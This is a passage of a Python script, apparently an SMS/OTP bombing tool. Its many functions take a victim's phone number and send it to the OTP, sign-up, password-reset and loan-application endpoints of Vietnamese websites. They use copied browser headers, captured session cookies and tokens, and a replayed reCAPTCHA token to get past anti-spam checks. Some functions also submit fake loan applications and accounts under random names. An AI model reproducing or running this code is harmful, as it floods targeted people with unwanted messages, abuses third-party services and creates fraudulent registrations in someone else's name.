    'referer': 'https://vietloan.vn/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    data = {
    'phone': sdt,
    '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
    }

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)

def send_otp_via_batdongsan(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        # 'cookie': 'con.unl.lat=1722272400; con.unl.sc=1; g_state={"i_p":1722365115669,"i_l":1}; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%222f8373e2-be24-412f-8c43-163568d0f3d4%22%2C%22expireDate%22%3A%222025-07-30T23%3A45%3A15.4546279Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d0efffb9-6e29-4b3f-8d35-077a9bd5edbe%22%2C%22expireDate%22%3A%222025-07-30T23%3A45%3A15.4547012Z%22%7D; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%22d0d2a10b-fa24-7e47-5a09-26e1aadf8015%22%2C%22c%22%3A1722357926566%2C%22l%22%3A1722357926566%7D; _cfuvid=gviR7OYgIOmdyT7s0ARpMy95ecrZEcqyEJQQ8ON1j0A-1722438792768-0.0.1.1-604800000; cf_clearance=8kuq88Bui2ZQp3xMbu6IS8E_J6DRNIzlj.i84sS9eec-1722439989-1.0.1.1-MDtjaMwRII2EZ70WMiAg_w5s4z1uVtSRFE84bQHiHWH6mqpBKpxBqfDTc4i5Q4nxWcK8FLxgtbBzpbuIwQW2gA',
        'dnt': '1',
        'priority': 'u=1, i',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    params = {
        'phoneNumber': sdt,
    }

    response = requests.get(
        'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
        params=params,
        headers=headers,
  )
	

def send_otp_via_GUMAC(sdt):
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'Origin': 'https://gumac.vn',
        'Referer': 'https://gumac.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
    }

    response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
    


def send_otp_via_FAHASA(sdt):
    cookies = {
        'frontend': '173c6828799e499e81cd64a949e2c73a',
        'frontend_cid': '7bCDwdDzwf8wpQKE',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=173c6828799e499e81cd64a949e2c73a; frontend_cid=7bCDwdDzwf8wpQKE',
        'dnt': '1',
        'origin': 'https://www.fahasa.com',
        'priority': 'u=1, i',
        'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
    }

    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
    
def send_otp_via_hopiness(sdt):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'DNT': '1',
        'Origin': 'https://shopiness.vn',
        'Referer': 'https://shopiness.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'action': 'verify-registration-info',
        'phoneNumber': sdt,
        'refCode': '',
    }

    response = requests.post('https://shopiness.vn/ajax/user', headers=headers, data=data)
    
def send_otp_via_modcha35(sdt):

    url = "https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32"

    payload = f"clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={sdt}&version=1.28"

    headers = {
    'User-Agent': "mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)",
    'Content-Type': "application/x-www-form-urlencoded",
    'uuid': "B4DD9661-2B0B-418F-B953-6AE71C0373EC",
    'APPNAME': "MC35",
    'mocha-api': "",
    'countryCode': "VN",
    'languageCode': "vi",
    'Accept-Language': "vi-VN;q=1"
    }

    response = requests.post(url, data=payload, headers=headers)
    
def send_otp_via_Bibabo(sdt):

    url = "https://one.bibabo.vn/api/v1/login/otp/createOtp"

    params = {
    'phone': sdt,
    'reCaptchaToken': "undefined",
    'appId': "7",
    'version': "2"
    }

    headers = {
    'User-Agent': "bibabo/522 CFNetwork/1474 Darwin/23.0.0",
    'Accept': "application/json, text/plain, */*",
    'accept-language': "vi-VN,vi;q=0.9"
    }

    response = requests.get(url, params=params, headers=headers)

    
def send_otp_via_MOCA(sdt):
    url = "https://moca.vn/moca/v2/users/role"

    params = {
    'phoneNumber': sdt
    }

    headers = {
    'User-Agent': "Pass/2.10.156 (iPhone; iOS 17.0.2; Scale/3.00)",
    'digest': "SHA-256=cgvOMMsYWgehDVly4KtMMT3F10WQDyMiQT05/hL5YhE=",
    'x-mof-ods': "{length=32,bytes=0x993b85c77b262672a287bb24b56259ca...61966184262e193f}",
    'x-mof-ds': "{length=32,bytes=0x993b85c77b262672a287bb24b56259ca...61966184262e193f}",
    'device-token': "4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA",
    'x-requested-with': "XMLHttpRequest",
    'device-id': "b51fb1bf16bd391f0b22e68ebf9efb3966acecfc0d587a91031b504754e312f1",
    'accept-language': "vi",
    'x-moca-api-version': "2",
    'platform': "P_IOS-2.10.156",
    'date': "Thu, 01 Aug 2024 13:15:05 GMT",
    'x-request-id': "4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA1722518105.413269",
    'pre-authorization': "hmac username=\"06b707de-6050-11eb-ae93-0242ac130002\", algorithm=\"hmac-sha256\", headers=\"date digest\", signature=\"cZevTUC0yW+WSAVer9McsgpV79XoaL+BTnocoHuzBjw=\""
    }

    response = requests.get(url, params=params, headers=headers)

    
def send_otp_via_pantio(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': sdt,
    }

    response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data)

    
def send_otp_via_Routine(sdt):

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=1hDuKB6LPnlgEOgn; wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=1hDuKB6LPnlgEOgn; private_content_version=e43cc8178a6a71fece0c6db77f4b56d1; PHPSESSID=piouum2lgnbb1usi60h4v29ap9; section_data_ids=%7B%22customer%22%3A1722519971%7D',
        'dnt': '1',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQyMTc2ODQiLCJhcCI6IjExMzQ0MDAwMDciLCJpZCI6IjMzMmYyMzU2YTZlYmEwOWUiLCJ0ciI6ImRkNTQwNTk1ZDY4NWE3MTFjOTNhYjY5NzhkZmY1YTIzIiwidGkiOjE3MjI1MTk5OTE4MDR9fQ==',
        'origin': 'https://routine.vn',
        'priority': 'u=1, i',
        'referer': 'https://routine.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-dd540595d685a711c93ab6978dff5a23-332f2356a6eba09e-01',
        'tracestate': '4217684@nr=0-1-4217684-1134400007-332f2356a6eba09e----1722519991804',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-newrelic-id': 'UAQGVlBbDBABVFZSBAkBVVcF',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'telephone': sdt,
        'isForgotPassword': '0',
    }

    response = requests.post('https://routine.vn/customer/otp/send/', headers=headers, data=data)

   
def send_otp_via_vayvnd(sdt):
    # Headers chung
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        'dnt': '1',
        'origin': 'https://vayvnd.vn',
        'priority': 'u=1, i',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    # Request 1: Tạo user
    json_data_1 = {
        'phone': sdt,
        'utm': [
            {
                'utm_source': 'leadbit',
                'utm_medium': 'cpa',
            },
        ],
        'cpaId': 2,
        'cpaLeadData': {
            'click_id': '66A8D2827EED7B49190B756A',
            'utm_campaign': '44559',
        },
        'sourceSite': 3,
        'regScreenResolution': {
            'width': 1920,
            'height': 1080,
        },
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }

    response_1 = requests.post('https://api.vayvnd.vn/v2/users', headers=headers, json=json_data_1)
    print(response_1.json())

    # Request 2: Yêu cầu reset mật khẩu
    json_data_2 = {
        'login': sdt,
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }

    response_2 = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data_2)
    print(response_2.json())

    # Request 3: Yêu cầu reset mật khẩu với antispam
    json_data_3 = {
        'login': sdt,
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
        'antispamCheckData': {
            'hostname': 'vayvnd.vn',
            'recaptchaResponse': '03AFcWeA4a3of5F2rQflfDDN3PoKGexeshUPBijwHLLt_g5MKfy8DOVF7AtAdhNcRg0tk8OxQFZMluITyXgxDF56auNDfD2IqOBzc_0YEQKhjz28R_3Cv7da1x3t73L6y1uGHmh_vbGE4nwjMo6uqQD_4XaGXbrjK3A_MECVrnlxqSzdcFHT_dWY8dZY_XZrVZD8qAaRrxewtpoGroniGyrMXDQBqvpO8cv5NHF6HzebGbHr9pcFdjurawUgyfpvJaIf818dt0Fl71g6BYQ2PDWk81ZI7m6Zz2sIcb_RINTz4VPgnKHO2EYvhnMkxdVHf5H2u5sV1eJuQ-Ess3AgShIQXTbUhorpjz9CDlnKfwcMtQmV47LB_wrJIhkGAyjO2s4Uadi_DJaoqQuk5KzpgWbG0v7hVWoL_FtCxdRioMgrj4zMMGHGUGjsaHUw5f1FJ5ehwPX3BbfFDxgv6G-LAhPOJ6D7QtWP_2K-1Di2Y-DMBiM15k4sr9-jQq7Hb6i44Df3m0Pe4sF8w4DD6rCrj7qMhQFhz-FxTCMyKg1AZttUoWVYEpkuEudROLWWBoATDsLwdO1ICLaEGeA9V0dRfcFYNm1bpF8AC7Iuya-df_55Uvb3UP1bGDNEvkTPXZIN8gFosYfWFTOt6JbTdWBM11vNT1YzC9rAIsrgCG3FShXF_6dy7_uxJ9v2gykpQ6bHe9EMJEK9xsQn50kOTTXOLJPXxOdplk4LdQfVzgkWsMnGPhbtK5n5E8hFHz--vQy61eAHHJ0gxs1ybOgFpEn53BDkKWXyOrOvvEDDdffBhwwDcl1C5zKRN1-_gYLfgEMI8Hxmq7AWfF_kQ6eOPq2DM5JY01v4nuLj06s-RQwyKO_R1q6IS5LvWek425nDxjt7ihJLbfUotuMCWDvnBm_pSm05pTm8WL6twt9vLd_K4BB-ME-5DFAHbmopkZj6rGQhXGLMWEU-rvgOG-qgZ1_VE_0-j254Sw19qZcz_bdUGXxeblMoWThlaMf8OQT5s9O1enSYTPWCtMhWsgDT5Crb2xMGHWkO5nbC0X2KOT-uNWNIMldpA3DSs4jTSecEhZW2NPAjygBqSs4ZsllUOl8gaq5hv352ysq6T6nFs_fpoBhCNnhNQR0_G3Qw80ZS7cfC1YlCoDAItOd9AgD0oWsvjV9gUkSz9WgmkCL0vxnndR2ixnyolsRZqMxT7Q8RirZZU-plNUDW0Tj7cfkGPib4MFZ5P3J08LPP1uSeuctw4HXSRheltiEvu5IFZ4UExasH5yMbyTBYSrAMw9IlO3s8KnNu9UQMX9pOzjo8wXdS4QiSoOo0PjQ4RV881eL6ojJv-py9IVmezFvPohm9JmcFRgzuXWnv5WpXyclW1AhTHjGc19emxXc92q2fnqouvYr3-cgQtFyHJInovng8kmUBa-d8mSuT-36a6LaiqKLi-cw0sCVXHmOdXnULf7DMh48AD6VLDw49jwYeczc3K3WJDz0cWJDPZwen8GmC-uuhIGi1hER1q6Mfq01GCKs2lLwbmCysD9xURNFGXu9NUjHoE0J6QHlxdq95scnOone1SIivS0Y9OlK192g_C_c26g-7-aMft1_QQ4pb7r7asb-yHglSBAdL3DMHk4ig2qMf5bMX2Z01GDbt6pAC0UIjtsuSI0zwNQiyWV6rePlXp9_5n0VZD2svaUel7KnIv6SFyrwo2kk1Y1iaahtbk6rIWYW-oYcU4Xo67PzkSkd5o2BdVbMNoqyoE3_64SdGbCJhpMixqxBJTKVqeKn0ohM1H7m8RDs-ECaAfEHO8j96z1E1P2m0HVO5zJNB-8WnIEW3gJ1X5OjymNfqrMNr94626PA04O9_-NPTwuKFmIJZE2aEtItXRBvXR1GUZBdpH32PrECRp8Mo-sOz1W7UBwkvAfaOvYDn3zJ-k54emVQ4bf-vEpvDLYKtffIHmy1dcSMP8vhJJgykim-fxJ8cEYYKpRxWrE9CiobKH78pDTEIWIj8GzCkxrqbe4ycj5kA',
        },
    }

    response_3 = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data_3)
    print(response_3.json())






def send_otp_via_tima(sdt):


    cookies = {
        'ASP.NET_SessionId': 'm1ooydpmdnksdwkm4lkadk4p',
        'UrlSourceTima_V3': '{"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"}',
        'tkld': 'b460087b-2c70-9d44-da8d-68d0d4c00f3a',
        'tbllender': 'tbllender',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'ASP.NET_SessionId=m1ooydpmdnksdwkm4lkadk4p; UrlSourceTima_V3={"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"}; tkld=b460087b-2c70-9d44-da8d-68d0d4c00f3a; tbllender=tbllender',
        'dnt': '1',
        'origin': 'https://tima.vn',
        'priority': 'u=0, i',
        'referer': 'https://tima.vn/vay-tien-online/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        'application_full_name': generate_random_name(),
        'application_mobile_phone': sdt,
        'CityId': '1',
        'DistrictId': '16',
        'rules': 'true',
        'TypeTime': '1',
        'application_amount': '0',
        'application_term': '0',
        'UsertAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'IsApply': '1',
        'ProvinceName': 'Thành phố Hà Nội',
        'DistrictName': 'Huyện Sóc Sơn',
        'product_id': '2',
    }

    response = requests.post('https://tima.vn/Borrower/RegisterLoanCreditFast', cookies=cookies, headers=headers, data=data)

def send_otp_via_paynet(sdt):

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '__RequestVerificationToken=zxA6lyDZVpywvn1LHgcIKm8LsCzx_R3icFZ2RYQXQXLaAcj2czJgJgcQ7glylX9PYWiS-ArycPkTIJSGcECxHdPiG3eyEiqG-dBqAkWMNPs1; ASP.NET_SessionId=y02wiifji0nhkleae0aqatst',
        'DNT': '1',
        'Origin': 'https://merchant.paynetone.vn',
        'Referer': 'https://merchant.paynetone.vn/User/Create',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'MobileNumber': sdt,
        'IsForget': 'N',
    }

    response = requests.post('https://merchant.paynetone.vn/User/GetOTP', headers=headers, data=data, verify=False)
    
def send_otp_via_moneygo(sdt):

    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSIsInZhbHVlIjoiUEtCV09IdmFlVkZWQ1R3c2ZIT01seSthcVdaMFhDb2lVTkEybjVJZksrQnR4dmliSEFnWkp0dklONE5LMVZBOUQxNXpaVDNWbmdadExaQmt3Vy9ZVzdYL0JWR2lSSU91RG40ZDVybERZaWJEcnhBNWhBVHYzVHBQbjdVR0x2S0giLCJtYWMiOiJhOTBjMzExYzg3YjM1MjY2ZGIwODk0ZThlNWFkYzEwNGMyYzc2ZmFmMmRlYzNkOTExNDM3M2E5ZjFmYWEzNjA1In0%3D',
        'laravel_session': 'eyJpdiI6IlpHaDc2cGgyc0g4akhrdHFkT0tic1E9PSIsInZhbHVlIjoiSjYxQWZ4VlA0UmFwVDVGdkE2TzQ2OU1PSDhJQlR3MVBlbzdKV3g3a3czcStucGpIbTJIRnVpR0l3ZVR3clJsWUxjSlFMRUFuK3NhQ2VKVC9hc2Q5QlJYZEhpRVdNa0xlV21XcFgrelpoQTBhSUdlNngvR0NSRVdzUEFJcXhPNXUiLCJtYWMiOiIxYmM4NDBkN2VhMTVhZTJhOGU5MzFlOTUwNDc4NzFhOTBhNzc1NTliZmE2MWM3MmUwNjZjNDAyMDg5OWZmODE4In0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSIsInZhbHVlIjoiUEtCV09IdmFlVkZWQ1R3c2ZIT01seSthcVdaMFhDb2lVTkEybjVJZksrQnR4dmliSEFnWkp0dklONE5LMVZBOUQxNXpaVDNWbmdadExaQmt3Vy9ZVzdYL0JWR2lSSU91RG40ZDVybERZaWJEcnhBNWhBVHYzVHBQbjdVR0x2S0giLCJtYWMiOiJhOTBjMzExYzg3YjM1MjY2ZGIwODk0ZThlNWFkYzEwNGMyYzc2ZmFmMmRlYzNkOTExNDM3M2E5ZjFmYWEzNjA1In0%3D; laravel_session=eyJpdiI6IlpHaDc2cGgyc0g4akhrdHFkT0tic1E9PSIsInZhbHVlIjoiSjYxQWZ4VlA0UmFwVDVGdkE2TzQ2OU1PSDhJQlR3MVBlbzdKV3g3a3czcStucGpIbTJIRnVpR0l3ZVR3clJsWUxjSlFMRUFuK3NhQ2VKVC9hc2Q5QlJYZEhpRVdNa0xlV21XcFgrelpoQTBhSUdlNngvR0NSRVdzUEFJcXhPNXUiLCJtYWMiOiIxYmM4NDBkN2VhMTVhZTJhOGU5MzFlOTUwNDc4NzFhOTBhNzc1NTliZmE2MWM3MmUwNjZjNDAyMDg5OWZmODE4In0%3D',
        'dnt': '1',
        'origin': 'https://moneygo.vn',
        'priority': 'u=0, i',
        'referer': 'https://moneygo.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        '_token': 'X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV',
        'total': '56688000',
        'phone': sdt,
        'agree': '1',
    }

    response = requests.post('https://moneygo.vn/dang-ki-vay-nhanh', cookies=cookies, headers=headers, data=data)

    

def send_otp_via_pico(sdt):
    # First request
    headers_1 = {
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://pico.vn',
        'priority': 'u=1, i',
        'referer': 'https://pico.vn/',
        'region-code': 'MB',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data_1 = {
        'name': generate_random_name(),
        'phone': sdt,
        'provinceCode': '92',
        'districtCode': '925',
        'wardCode': '31261',
        'address': '123',
    }

    response_1 = requests.post('https://auth.pico.vn/user/api/auth/register', headers=headers_1, json=json_data_1)
    
    # Handle the response of the first request if necessary
    print(response_1.json())

    # Second request
    headers_2 = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'access': '206f5b6838b4e357e98bf68dbb8cdea5',
        'channel': 'b2c',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://pico.vn',
        'party': 'ecom',
        'platform': 'Desktop',
        'priority': 'u=1, i',
        'referer': 'https://pico.vn/',
        'region-code': 'MB',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'uuid': 'cc31d0b5815a483b92f547ab8438da53',
    }

    json_data_2 = {
        'phone': sdt,
    }

    response_2 = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers_2, json=json_data_2)
    
    # Handle the response of the second request if necessary
    print(response_2.json())













def send_otp_via_PNJ(sdt):


    cookies = {
        'CDPI_VISITOR_ID': '78166678-ea1e-47ae-9e12-145c5a5fafc4',
        'CDPI_RETURN': 'New',
        'CDPI_SESSION_ID': 'f3a5c6c7-2ef6-4d19-a792-5e3c0410677f',
        'XSRF-TOKEN': 'eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D',
        'mypnj_session': 'eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
